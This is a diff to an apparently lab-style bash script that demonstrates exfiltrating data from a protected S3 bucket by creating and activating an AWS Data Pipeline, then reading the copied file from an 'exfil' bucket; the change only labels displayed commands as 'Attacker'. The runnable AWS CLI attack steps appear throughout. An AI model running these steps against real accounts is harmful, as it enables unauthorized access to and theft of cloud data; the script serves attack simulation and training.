@@ -24,12 +24,14 @@ ATTACK_COMMANDS=()
 
 # Display a command before executing it
 show_cmd() {
-    echo -e "${DIM}\$ $*${NC}"
+    local identity="$1"; shift
+    echo -e "${DIM}[${identity}] \$ $*${NC}"
 }
 
 # Display AND record an attack command
 show_attack_cmd() {
-    echo -e "\n${CYAN}\$ $*${NC}"
+    local identity="$1"; shift
+    echo -e "\n${CYAN}[${identity}] \$ $*${NC}"
     ATTACK_COMMANDS+=("$*")
 }
 
@@ -94,7 +96,7 @@ unset AWS_SESSION_TOKEN
 echo "Using region: $AWS_REGION"
 
 # Verify starting user identity
-show_cmd "aws sts get-caller-identity --query 'Arn' --output text"
+show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
 CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
 echo "Current identity: $CURRENT_USER"
 
@@ -106,7 +108,7 @@ echo -e "${GREEN}✓ Verified starting user identity${NC}\n"
 
 # Step 3: Get account ID
 echo -e "${YELLOW}Step 3: Getting account ID${NC}"
-show_cmd "aws sts get-caller-identity --query 'Account' --output text"
+show_cmd "Attacker" "aws sts get-caller-identity --query 'Account' --output text"
 ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
 echo "Account ID: $ACCOUNT_ID"
 echo -e "${GREEN}✓ Retrieved account ID${NC}\n"
@@ -114,7 +116,7 @@ echo -e "${GREEN}✓ Retrieved account ID${NC}\n"
 # Step 4: Verify we don't have direct bucket access
 echo -e "${YELLOW}Step 4: Verifying we don't have direct access to sensitive bucket${NC}"
 echo "Attempting to read sensitive data directly (should fail)..."
-show_cmd "aws s3 cp s3://$SENSITIVE_BUCKET/secret-data.txt -"
+show_cmd "Attacker" "aws s3 cp s3://$SENSITIVE_BUCKET/secret-data.txt -"
 if aws s3 cp s3://$SENSITIVE_BUCKET/secret-data.txt - 2>/dev/null; then
     echo -e "${RED}⚠ Unexpectedly have direct bucket access already${NC}"
 else
@@ -138,7 +140,7 @@ echo ""
 echo -e "${YELLOW}Step 6: Creating Data Pipeline${NC}"
 echo "Pipeline name: $PIPELINE_NAME"
 
-show_attack_cmd "aws datapipeline create-pipeline --region $AWS_REGION --name \"$PIPELINE_NAME\" --unique-id \"datapipeline-\$(date +%s)\" --query 'pipelineId' --output text"
+show_attack_cmd "Attacker" "aws datapipeline create-pipeline --region $AWS_REGION --name \"$PIPELINE_NAME\" --unique-id \"datapipeline-\$(date +%s)\" --query 'pipelineId' --output text"
 PIPELINE_ID=$(aws datapipeline create-pipeline \
     --region $AWS_REGION \
     --name "$PIPELINE_NAME" \
@@ -200,7 +202,7 @@ echo -e "${GREEN}✓ Pipeline definition created${NC}\n"
 # Step 8: Put pipeline definition
 echo -e "${YELLOW}Step 8: Uploading pipeline definition${NC}"
 
-show_attack_cmd "aws datapipeline put-pipeline-definition --region $AWS_REGION --pipeline-id \"$PIPELINE_ID\" --pipeline-definition file:///tmp/pipeline_definition.json --output json"
+show_attack_cmd "Attacker" "aws datapipeline put-pipeline-definition --region $AWS_REGION --pipeline-id \"$PIPELINE_ID\" --pipeline-definition file:///tmp/pipeline_definition.json --output json"
 aws datapipeline put-pipeline-definition \
     --region $AWS_REGION \
     --pipeline-id "$PIPELINE_ID" \
@@ -224,7 +226,7 @@ echo -e "${GREEN}✓ Pipeline definition uploaded successfully${NC}\n"
 echo -e "${YELLOW}Step 9: Activating the pipeline${NC}"
 echo "This will launch an EC2 instance and execute the exfiltration command..."
 
-show_attack_cmd "aws datapipeline activate-pipeline --region $AWS_REGION --pipeline-id \"$PIPELINE_ID\" --output json"
+show_attack_cmd "Attacker" "aws datapipeline activate-pipeline --region $AWS_REGION --pipeline-id \"$PIPELINE_ID\" --output json"
 aws datapipeline activate-pipeline \
     --region $AWS_REGION \
     --pipeline-id "$PIPELINE_ID" \
@@ -257,7 +259,7 @@ echo -e "${YELLOW}Step 11: Verifying exfiltration was successful${NC}"
 echo "Checking if the data was exfiltrated to the exfil bucket..."
 
 # First check if the file exists
-show_cmd "aws s3 ls s3://$EXFIL_BUCKET/exfiltrated.txt --region $AWS_REGION"
+show_cmd "Attacker" "aws s3 ls s3://$EXFIL_BUCKET/exfiltrated.txt --region $AWS_REGION"
 if aws s3 ls s3://$EXFIL_BUCKET/exfiltrated.txt --region $AWS_REGION &> /dev/null; then
     echo -e "${GREEN}✓ Exfiltrated file found in bucket!${NC}"
     echo ""
@@ -275,7 +277,7 @@ echo -e "${YELLOW}Step 12: Reading the exfiltrated sensitive data${NC}"
 echo "Retrieving the exfiltrated file from: s3://$EXFIL_BUCKET/exfiltrated.txt"
 echo ""
 
-show_attack_cmd "aws s3 cp s3://$EXFIL_BUCKET/exfiltrated.txt - --region $AWS_REGION"
+show_attack_cmd "Attacker" "aws s3 cp s3://$EXFIL_BUCKET/exfiltrated.txt - --region $AWS_REGION"
 if aws s3 cp s3://$EXFIL_BUCKET/exfiltrated.txt - --region $AWS_REGION 2>/dev/null; then
     echo ""
     echo -e "${GREEN}✓ Successfully read exfiltrated sensitive data!${NC}"
